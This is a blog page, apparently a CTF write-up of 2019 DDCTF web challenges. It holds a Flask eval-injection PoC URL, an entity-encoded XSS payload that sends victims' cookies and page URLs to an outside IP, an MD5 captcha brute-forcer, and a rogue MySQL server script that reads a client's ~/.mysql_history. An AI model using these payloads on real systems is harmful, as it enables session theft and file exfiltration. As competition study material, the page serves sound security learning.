+                if resp is None: resp = &apos;&apos; 
+                resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos; 
+                resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; 
+                session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;] 
+                session[&apos;points&apos;] = request.prev_session[&apos;points&apos;] 
+                break 
+            except Exception, e: 
+                if resp is None: resp = &apos;&apos; 
+                #resp += str(e) # only for debugging 
+                continue 
+            if ret_val is not None: 
+                if resp is None: resp = ret_val 
+                else: resp += ret_val 
+    if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404) 
+    session.modified = True 
+    return resp 
+
+@app.route(url_prefix+&apos;/&apos;) 
+def entry_point(): 
+    querystring = urllib.unquote(request.query_string) 
+    request.event_queue = [] 
+    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100: 
+        querystring = &apos;action:index;False#False&apos; 
+    if &apos;num_items&apos; not in session: 
+        session[&apos;num_items&apos;] = 0 
+        session[&apos;points&apos;] = 3 
+        session[&apos;log&apos;] = [] 
+    request.prev_session = dict(session) 
+    trigger_event(querystring) 
+    return execute_event_loop() 
+
+# handlers/functions below -------------------------------------- 
+
+def view_handler(args): 
+    page = args[0] 
+    html = &apos;&apos; 
+    html += &apos;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;]) 
+    if page == &apos;index&apos;: 
+        html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos; 
+        html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos; 
+        html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos; 
+    elif page == &apos;shop&apos;: 
+        html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos; 
+    elif page == &apos;reset&apos;: 
+        del session[&apos;num_items&apos;] 
+        html += &apos;Session reset.&lt;br /&gt;&apos; 
+    html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; 
+    return html 
+
+def index_handler(args): 
+    bool_show_source = str(args[0]) 
+    bool_download_source = str(args[1]) 
+    if bool_show_source == &apos;True&apos;: 
+
+        source = open(&apos;eventLoop.py&apos;, &apos;r&apos;) 
+        html = &apos;&apos; 
+        if bool_download_source != &apos;True&apos;: 
+            html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos; 
+            html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; 
+
+        for line in source: 
+            if bool_download_source != &apos;True&apos;: 
+                html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;) 
+            else: 
+                html += line 
+        source.close() 
+
+        if bool_download_source == &apos;True&apos;: 
+            headers = {} 
+            headers[&apos;Content-Type&apos;] = &apos;text/plain&apos; 
+            headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos; 
+            return Response(html, headers=headers) 
+        else: 
+            return html 
+    else: 
+        trigger_event(&apos;action:view;index&apos;) 
+
+def buy_handler(args): 
+    num_items = int(args[0]) 
+    if num_items &lt;= 0: return &apos;invalid number({}) of diamonds to buy&lt;br /&gt;&apos;.format(args[0]) 
+    session[&apos;num_items&apos;] += num_items  
+    trigger_event([&apos;func:consume_point;{}&apos;.format(num_items), &apos;action:view;index&apos;]) 
+
+def consume_point_function(args): 
+    point_to_consume = int(args[0]) 
+    if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException() 
+    session[&apos;points&apos;] -= point_to_consume 
+
+def show_flag_function(args): 
+    flag = args[0] 
+    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
+    return &apos;You naughty boy! ;) &lt;br /&gt;&apos; 
+
+def get_flag_handler(args): 
+    if session[&apos;num_items&apos;] &gt;= 5: 
+        trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries 
+    trigger_event(&apos;action:view;index&apos;) 
+
+if __name__ == &apos;__main__&apos;: 
+    app.run(debug=False, host=&apos;0.0.0.0&apos;) </code></pre><p>不看源码也应该能猜到大概，这道题目大概意思是每个session可以买三次钻石，但是买到五颗才有可能去查看flag，所以首先需要绕过，购买限制，然后进行下一步的可控参数构造函数来执行。</p>
+<p>首先从flag函数入手。</p>
+<pre><code>def get_flag_handler(args): 
+    if session[&apos;num_items&apos;] &gt;= 5: 
+        trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries 
+    trigger_event(&apos;action:view;index&apos;) </code></pre><p>如果session中已经购买的数量大于5，那么调用trigger_event(),</p>
+<pre><code>def trigger_event(event): 
+    session[&apos;log&apos;].append(event) 
+    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] 
+    if type(event) == type([]): 
+        request.event_queue += event 
+    else: 
+        request.event_queue.append(event) </code></pre><p>而最终执行了此flag函数之后并不会直接显示flag，这一句session[‘log’].append(event)会将flag拼接到session中去，flask的session分三部分组成，第一部分就是正常的一些提交数据，第二部分时间戳，然后拼接上签名，第一部分我们是可以直接明文查看的，附上P牛的session脚本。</p>
+<pre><code>#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+
+def decryption(payload):
+    payload, sig = payload.rsplit(b&apos;.&apos;, 1)
+    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)
+
+    decompress = False
+    if payload.startswith(b&apos;.&apos;):
+        payload = payload[1:]
+        decompress = True
+
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception(&apos;Could not base64 decode the payload because of &apos;
+                         &apos;an exception&apos;)
+
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception(&apos;Could not zlib decompress the payload before &apos;
+                             &apos;decoding the payload&apos;)
+
+    return session_json_serializer.loads(payload)
+
+if __name__ == &apos;__main__&apos;:
+    print decryption(sys.argv[1].encode())</code></pre><p>首先随便复制一段题目的session来进行解码。</p>
+<p><img src="http://47.106.185.69/1/./img/1555572984.jpg" alt></p>
+<p>session保存了数据，已经买了两个还有一次购买的机会。还有log，是最后查看flag的时候会拼接进去的数据。</p>
+<p>并且log只会保存五条。然后就是如何执行def get_flag_handler(args):  函数了。</p>
+<p>在def execute_event_loop(): 函数中有eval函数可以帮助我们执行函数。并且存在拼接，输入的参数将会拼接_handler，然后执行相应的函数。</p>
+<pre><code>try: 
+       event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) 
+       ret_val = event_handler(args) </code></pre><p>但是对输入字符有控制，</p>
+<pre><code>valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) </code></pre><p>只能输入限定字符拼接指定的handler或者function，将#url编码，来绕过eval函数的解析，第一次的拼接为trigger_event#_handler，在eval函数里执行则会省略#后的_hander，从而执行trigger_event，通过trigger_event()将flag写进session_log。</p>
+<p>但是如果要执行execute_event_loop()里的eval和我们传入的参数，需要def trigger_event(event)里的</p>
+<pre><code>if type(event) == type([]): 
+    request.event_queue += event 
+else: 
+    request.event_queue.append(event)</code></pre><p>将事件加入队列。从而执行bug，get_flag</p>
+<p>最终poc </p>
+<pre><code>http://116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;30%23action:get_flag;322</code></pre><p>因为购买的规则是先购买，购买成功后在判断是否合法，此时get_flag已经执行，所以便可以绕过只能购买三个的限制。</p>
+<p><img src="http://47.106.185.69/1/./img/1555588231.jpg" alt></p>
+<p>可以看到执行buy,get_flag之后才会判断合法，进而回溯，并不影响获得flag，而在获得flag之后才会执行判断回溯函数，将购买数量重置。</p>
+<p><img src="http://47.106.185.69/1/./img/1555579003.jpg" alt></p>
+<p>对返回的数据进行解码。</p>
+<p><img src="http://47.106.185.69/1/./img/1555579055.jpg" alt></p>
+<h1 id="欢迎报名DDCTF"><a href="#欢迎报名DDCTF" class="headerlink" title="欢迎报名DDCTF"></a>欢迎报名DDCTF</h1><p>由于题目暂时关闭，简单写下此题wp。</p>
+<p>进去之后是一个报名页面，前两个框限定了字符20且必填，最后一个框无任何限制，但是未作XSS限制。</p>
+<p>听说这里也可以XSS 读取源码，不过我是简单XSS</p>
+<pre><code>&lt;img src=vpsIP&gt;</code></pre><p>请求头里带了一个提示，<a href="http://139.199.107.193/hint.php" target="_blank" rel="noopener">http://139.199.107.193/hint.php</a></p>
+<p><img src="http://47.106.185.69/1/./img/1555665443.jpg" alt></p>
+<p>发表文章之后会给你文章的链接，开始还不知道有什么用。</p>
+<p><img src="http://47.106.185.69/1/./img/1555665488.jpg" alt></p>
+<p>发现反馈页面，这就很清楚了发表文章，然后给服务器来查看，导致XSS，</p>
+<p>XSS绕过不多说了，可以参考我的XSS小结里的svg黑魔法。</p>
+<pre><code>&lt;svg&gt;&lt;script&gt;
+
+&amp;#118;&amp;#97;&amp;#114;&amp;#32;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#52;&amp;#55;&amp;#46;&amp;#49;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#56;&amp;#53;&amp;#46;&amp;#54;&amp;#57;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#105;&amp;#110;&amp;#100;&amp;#101;&amp;#120;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#59;
+&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#40;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#73;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&amp;#40;&amp;#41;&amp;#41;&amp;#46;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#43;&amp;#39;&amp;#47;&amp;#63;&amp;#107;&amp;#101;&amp;#101;&amp;#112;&amp;#115;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#49;&amp;#38;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#116;&amp;#111;&amp;#112;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#40;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#38;&amp;#38;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#41;&amp;#63;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#58;&amp;#39;&amp;#39;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#59;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#59;
+
+
+&lt;/script&gt;</code></pre><p>加载XSS脚本，简单提一下，在svg标签里的所有实体化编码都可以被解析还原，因为这里投稿过滤了单引号双引号等于号括号，能过滤的都过滤了。</p>
+<p>验证码脚本。</p>
+<pre><code># -*- coding: utf-8 -*-
+import hashlib
+from multiprocessing.dummy import Pool as ThreadPool
+# MD5截断数值已知 求原始数据
+# 例子 substr(md5(captcha), 0, 6)=60b7ef
+
+def md5(s):  # 计算MD5字符串
+    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()
+
+keymd5 = &apos;5ffe8d&apos;   #已知的md5截断值
+md5start = 0   # 设置题目已知的截断位置
+md5length = 6
+
+def findmd5(sss):    # 输入范围 里面会进行md5测试
+    key = sss.split(&apos;:&apos;)
+    start = int(key[0])   # 开始位置
+    end = int(key[1])    # 结束位置
+    result = 0
+    for i in range(start, end):
+        # print(md5(i)[md5start:md5length])
+        if md5(i)[0:6] == keymd5:            # 拿到加密字符串
+            result = i
+            print(result)    # 打印
+            break
+
+
+list=[]  # 参数列表
+for i in range(10):   # 多线程的数字列表 开始与结尾
+    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))
+pool = ThreadPool()    # 多线程任务
+pool.map(findmd5, list) # 函数 与参数列表
+pool.close()
+pool.join()</code></pre><p>然后可以打到cookie执行所有的js脚本</p>
+<pre><code>http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php</code></pre><p>的页面显示没有登陆，应该是需要管理员查看此页面，读取admin.php源码得到新的做题目录。</p>
+<pre><code>http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=</code></pre><p>宽字节注入。获得flag。</p>
+<h1 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h1><p>这道题考的知识点比较神仙操作。</p>
+<p>参考：<a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a></p>
+<p>MySQL协议中比较特别的一点就是客户端并不会去记录已请求的命令，而是根据服务器的响应来执行查询。</p>
+<p>这意味着恶意MySQL服务器可以模拟初始握手过程，等待SQL语句数据包，忽略这个数据包然后响应一个LOCAL DATA INFILE请求。</p>
+<p>也就是在我们在服务端运行py文件模拟mysql服务器，客户端连接的时候构造恶意数据包读取客户端的文件。</p>
+<p>题目提供的 agent.py 其实是为了检测客户端本地是否开启了 mysql 服务，只需要往回发送字符串 mysqld 就能绕过检测。</p>
+<p>首先运行agent.py 只是为了检测是否开启了mysql，</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 12/1/2019 2:58 PM
+# @Author  : fz
+# @Site    : 
+# @File    : agent.py
+# @Software: PyCharm
+
+import json
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from optparse import OptionParser
+from subprocess import Popen, PIPE
+
+
+class RequestHandler(BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        request_path = self.path
+
+        print(&quot;\n----- Request Start -----&gt;\n&quot;)
+        print(&quot;request_path :&quot;, request_path)
+        print(&quot;self.headers :&quot;, self.headers)
+        print(&quot;&lt;----- Request End -----\n&quot;)
+
+        self.send_response(200)
+        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
+        self.end_headers()
+
+        result = self._func()
+        self.wfile.write(json.dumps(result))
+
+
+    def do_POST(self):
+        request_path = self.path
+
+        # print(&quot;\n----- Request Start -----&gt;\n&quot;)
+        print(&quot;request_path : %s&quot;, request_path)
+
+        request_headers = self.headers
+        content_length = request_headers.getheaders(&apos;content-length&apos;)
+        length = int(content_length[0]) if content_length else 0
+
+        # print(&quot;length :&quot;, length)
+
+        print(&quot;request_headers : %s&quot; % request_headers)
+        print(&quot;content : %s&quot; % self.rfile.read(length))
+        # print(&quot;&lt;----- Request End -----\n&quot;)
+
+        self.send_response(200)
+        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
+        self.end_headers()
+        result = self._func()
+        self.wfile.write(json.dumps(result))
+
+    def _func(self):
+        netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE)
+        netstat.wait()
+
+        ps_list = netstat.stdout.readlines()
+        result = [{&apos;local_address&apos;:&quot;0.0.0.0:3306&quot;,&quot;Process_name&quot;:&quot;1234/mysqld&quot;}]
+        for item in ps_list[2:]:
+            tmp = item.split()
+            Local_Address = tmp[3]
+            Process_name = tmp[6]
+            tmp_dic = {&apos;local_address&apos;: Local_Address, &apos;Process_name&apos;: &apos;mysqld&apos;}
+            result.append(tmp_dic)
+        return result
+
+    do_PUT = do_POST
+    do_DELETE = do_GET
+
+
+def main():
+    port = 8123
+    print(&apos;Listening on localhost:%s&apos; % port)
+    server = HTTPServer((&apos;0.0.0.0&apos;, port), RequestHandler)
+    server.serve_forever()
+
+
+if __name__ == &quot;__main__&quot;:
+    parser = OptionParser()
+    parser.usage = (
+        &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot;
+        &quot;Run:\n\n&quot;)
+    (options, args) = parser.parse_args()
+
+    main()</code></pre><p>然后运行以下脚本读取flag。</p>
+<pre><code>import socket
+from time import sleep
+
+filename=&apos;~/.mysql_history&apos;
+
+a=&apos;4a0000000a352e352e353300050000007b212f663926524900fff72102000f8015000000000000000000005963644f3d2336265b796f41006d7973716c5f6e61746976655f70617373776f726400&apos;.decode(&apos;hex&apos;)
+b=&apos;0100000200&apos;.decode(&apos;hex&apos;)
+c=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
+
+HOST = &apos;0.0.0.0&apos;
+PORT = 3306
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(5)
+
+print &apos;Server start at: %s:%s&apos; %(HOST, PORT)
+print &apos;wait for connection...&apos;
+
+while True:
+    conn, addr = s.accept()
+    print &apos;Connected by &apos;, addr
+    conn.send(a)
+    print conn.recv(1024).encode(&apos;hex&apos;)
+    conn.send(b)
+    print conn.recv(1024).encode(&apos;hex&apos;)
+    conn.send(c)
+    print conn.recv(1024)[4:]</code></pre><p><img src="http://47.106.185.69/1/./img/1555740061.jpg" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/14/2019DDCTF/" data-id="ck0l0oh8x0001py2iyb1vrrhj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/20/反序列化学习/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          PHP反序列化学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/13/西湖挑战赛/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">西湖挑战赛web</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
